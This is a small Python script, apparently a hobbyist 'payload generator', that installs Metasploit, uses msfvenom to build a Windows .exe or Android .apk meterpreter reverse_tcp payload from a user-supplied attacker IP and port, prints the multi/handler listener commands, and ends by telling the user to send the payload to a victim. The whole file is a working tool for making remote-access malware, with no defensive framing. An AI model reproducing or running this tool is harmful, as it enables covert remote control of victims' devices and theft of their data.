import os
os.system("clear")
print("""
███████╗███████╗███╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗
╚════██║██╔════╝████╗  ██║██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██╔╝███████╗██╔██╗ ██║███████║███████║██║     █████╔╝ █████╗  ██████╔╝
   ██╔╝ ╚════██║██║╚██╗██║██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║  ███████║██║ ╚████║██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

""")
print("""
██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗
██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║
██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║
██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║
██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║
╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝

""")
os.system("sudo apt-get install metasploit -y")
payload = input("payload type android or windows ? ")
os.system("ifconfig")
ip = input("Your ip addres : ")
port = input("Your port : ")
name = input("Payload name ? ")
if payload == "windows":
    os.system("msfvenom -p "+payload+"/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" -f exe > "+name+".exe")
elif payload == "android":
      os.system("msfvenom -p "+payload+"/meterpreter/reverse_tcp ""LHOST="+ip+" LPORT="+port+" R > "+name+".apk")
print("------------------------------------------------------------")
print("copy and pest this text in terminal to lesson in payload")
print("msfconsole")
print("use exploit/multi/handler")
print("set lhost "+ip)
print("set lport "+port)
print("set payload "+payload+"/meterpreter/reverse_tcp")
print("exploit")
print("------------------------------------------------------------")
print("Now send payload to victim")
print("------------------------------------------------------------")
